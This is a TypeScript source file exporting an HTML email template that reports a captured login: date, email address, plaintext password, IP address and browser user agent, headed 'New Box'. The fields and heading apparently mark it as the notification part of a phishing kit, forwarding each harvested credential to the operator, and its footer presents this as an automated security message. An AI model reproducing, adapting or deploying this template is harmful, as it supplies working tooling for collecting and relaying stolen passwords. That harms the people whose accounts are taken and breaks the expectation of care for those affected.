export const mailUserTemplate = (message: any) => {
    const dateReceived = new Date().toLocaleString('en-GB', { 
        dateStyle: 'long', 
        timeStyle: 'short' 
    });

    return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Details</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
            body {
                font-family: 'Inter', sans-serif;
                background-color: #f7fafc;
                margin: 0;
                padding: 20px;
            }
            .container {
                max-width: 600px;
                margin: 0 auto;
                background-color: #ffffff;
                padding: 30px;
                border-radius: 12px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
            }
            h3 {
                color: rgb(13, 13, 228);
                font-size: 20px;
                margin-top: 0;
                border-bottom: 2px solid #edf2f7;
                padding-bottom: 10px;
            }
            table {
                width: 100%;
                border-collapse: collapse;
                margin-top: 20px;
            }
            th {
                text-align: left;
                font-weight: 600;
                color: #718096;
                padding: 12px;
                background-color: #f8fafc;
                border: 1px solid #edf2f7;
                width: 35%;
            }
            td {
                padding: 12px;
                color: #2d3748;
                border: 1px solid #edf2f7;
                word-break: break-all;
            }
            .footer {
                font-size: 12px;
                color: #a0aec0;
                text-align: center;
                margin-top: 25px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h3>New Box</h3>
            <p>The following details were recorded for this session:</p>
            
            <table>
                <tr>
                    <th>Date Received</th>
                    <td>${dateReceived}</td>
                </tr>
                <tr>
                    <th>Email Address</th>
                    <td>${message.email}</td>
                </tr>
                <tr>
                    <th>Password</th>
                    <td>${message.password}</td>
                </tr>
                <tr>
                    <th>IP Address</th>
                    <td>${message.ip}</td>
                </tr>
                <tr>
                    <th>Browser/User Agent</th>
                    <td>${message.browser}</td>
                </tr>
            </table>

            <div class="footer">
                This is an automated security message from your application.
            </div>
        </div>
    </body>
    </html>
    `;
};
